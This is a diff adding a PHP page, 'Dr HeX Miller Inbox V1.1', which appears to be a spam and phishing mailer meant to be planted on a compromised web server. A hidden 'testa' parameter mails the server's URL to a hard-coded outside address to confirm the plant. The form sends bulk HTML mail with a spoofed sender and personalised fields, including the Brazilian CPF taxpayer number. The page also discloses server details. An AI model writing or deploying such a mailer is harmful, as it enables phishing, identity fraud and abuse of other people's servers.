@@ -1,0 +1,128 @@
+<?php
+function generateRandomString($length = 7) {
+    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
+    $charactersLength = strlen($characters);
+    $randomString = '';
+    for ($i = 0;$i < $length;$i++) {
+        $randomString.= $characters[rand(0, $charactersLength - 1) ];
+    }
+    return $randomString;
+}
+if (isset($_GET['testa'])) {
+    $email = "pz@hotmail.com";
+    $web = $_SERVER["HTTP_HOST"];
+    $inj = $_SERVER["REQUEST_URI"];
+    $target = rawurldecode($web . $inj);
+    $envio = mail("$email", "[v] http://$target", "http://$target");
+    if ($envio) {
+        echo '<span style="font-family: monospace;">[+] FOI</span><br>';
+    } else {
+        echo '<span style="font-family: monospace;">[-] N?</span><br>';
+    }
+}
+$testa = $_POST['veio'];
+if ($testa != "") {
+    $message = $_POST['html'];
+    $subject = $_POST['assunto'];
+    $nome = $_POST['Name'];
+    $de = $_POST['de'];
+    $to = $_POST['emails'];
+    $host = "<font color='#FFFFFF'>" . $_SERVER["HTTP_HOST"] . " </font>";
+    $email = explode("
+", $to);
+    $message = stripslashes($message);
+    $i = 0;
+    $count = 1;
+    while ($email[$i]) {
+        $aux = explode(';', $email[$i]);
+        $dataHora = date("y-m-d h:i:s");
+        $boundary = $email[$i];
+        $codig = " - ( $boundary
+ )";
+        $EmailTemporario = $aux[0];
+        $message = stripslashes($message);
+        $rnd = rand(10000000, 99999999);
+        $inbix = generateRandomString();
+        $msgy = str_replace("&email&", $EmailTemporario, $message);
+        $msgx = str_replace("&rand&", $rnd, $msgy);
+        $msgg = str_replace("&fuck&", generateRandomString(), $msgx);
+        $msgz = str_replace("&nome&", $aux[1], $msgg);
+        $msga = str_replace("&cpf&", $aux[2], $msgz);
+        $msgb = str_replace("&nome&", $aux[1], $subject);
+        $msgb = str_replace("&email&", $EmailTemporario, $msgb);
+        $msgb = str_replace("&rand&", $rnd, $msgb);
+        $de = str_replace("&rand&", $rnd, $de);
+        $nome = str_replace("&rand&", $rnd, $nome);
+        $nome = str_replace("&email&", $EmailTemporario, $nome);
+        $headers = "MIME-Version: 1.0
+";
+        $headers.= "Content-type: text/html; charset=iso-8859-1
+";
+        $headers.= "From: " . $nome . " <" . $de . ">
+";
+        if (mail($EmailTemporario, $msgb, $msga, $headers)) echo 'foi';
+        else echo 'nao foi';
+        $i++;
+        $count++;
+    }
+    $count--;
+    echo "[]";
+    if ($ok == "ok") echo "[]";
+}
+?>
+
+
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>SMTP</title>
+</head>
+
+<body>
+<p>
+<span style="text-align: center; font-size: 14px; color: #000; font-weight: bold; font-style: italic;">
+<form action="" method="post" enctype="multipart/form-data" name="form1">
+  <input type="hidden" name="veio" value="sim" />
+</span>
+</p>
+<table width="720" height="496" border="0">
+  <tr>
+    <td><p style="text-align: center; font-size: 36px; color: #009; font-weight: bold; font-style: italic;">Dr HeX Miller Inbox V1.1</p>
+    <p style="text-align: center; font-size: 14px; color: #000; font-weight: bold; font-style: italic;">Subject: 
+      <input name="assunto" type="text"class="normal" id="assunto" style="width:88%" value="" size="1" />
+    </p>
+    <p style="text-align: center; font-size: 14px; color: #000; font-weight: bold; font-style: italic;">Email: 
+      <input name="de" type="text"class="normal" id="de" style="width:88%" value="Exmple@exmple.com" size="1" />
+    </p>
+    <p style="text-align: center; font-size: 14px; color: #000; font-weight: bold; font-style: italic;">Name: 
+      <input name="Name" type="text"class="normal" id="Name" style="width:88%" value="Name" size="1" />
+    </p>
+    <p style="text-align: center; font-size: 14px; color: #000; font-weight: bold; font-style: italic;">HTML:
+      <textarea name="html" style="width:40%" rows="8" wrap="virtual" class="normal" id="html" cols="1"></textarea>
+      *.*Email List
+      <textarea name="emails" style="width:40%" rows="8" wrap="virtual" class="normal" id="emails" cols="1">
+</textarea>
+    </p>
+    </p>
+    <p style="text-align: center; font-size: 14px; color: #000; font-weight: bold; font-style: italic;">
+    <p><input name="txt" type="checkbox" value="Text Only" />Text Only</p><input name="txt" type="checkbox" value="Text Only" />Use SMTP</p>
+    
+<p>SMTP Host: &nbsp; &nbsp; &nbsp; &nbsp; <input name="host" type="text" /></p>
+
+<p>SMTP Email: &nbsp; &nbsp; &nbsp; <input name="emailsmtp" type="text" /></p>
+
+<p>SMTP Password: <input name="pass" type="password" /></p>
+
+<p>SMTP Port : &nbsp; &nbsp; &nbsp; &nbsp; <input name="port" type="text" /><br />
+&nbsp;</p>
+      <input type="submit" name="Submit" id="enviar" value="SEND">
+    </p>
+    <p style="text-align: center; font-size: 14px; color: #000; font-weight: bold; font-style: italic;">&nbsp;</p>
+    <p style="text-align: center; font-size: 14px; color: #000; font-weight: bold; font-style: italic;">&nbsp;</p>
+    <p style="text-align: left; font-size: 14px; color: #000; font-weight: bold; font-style: italic;">Server Name: <?php echo $UNAME = @php_uname(); ?><br />
+IP: <?php echo $_SERVER['SERVER_ADDR']; ?><br />
+Email admin: <?php echo $_SERVER['SERVER_ADMIN']; ?> <br>
+OS: <?php echo $OS = @PHP_OS; ?></p></td>
+  </tr>
+</table>
+</body>
+</html>
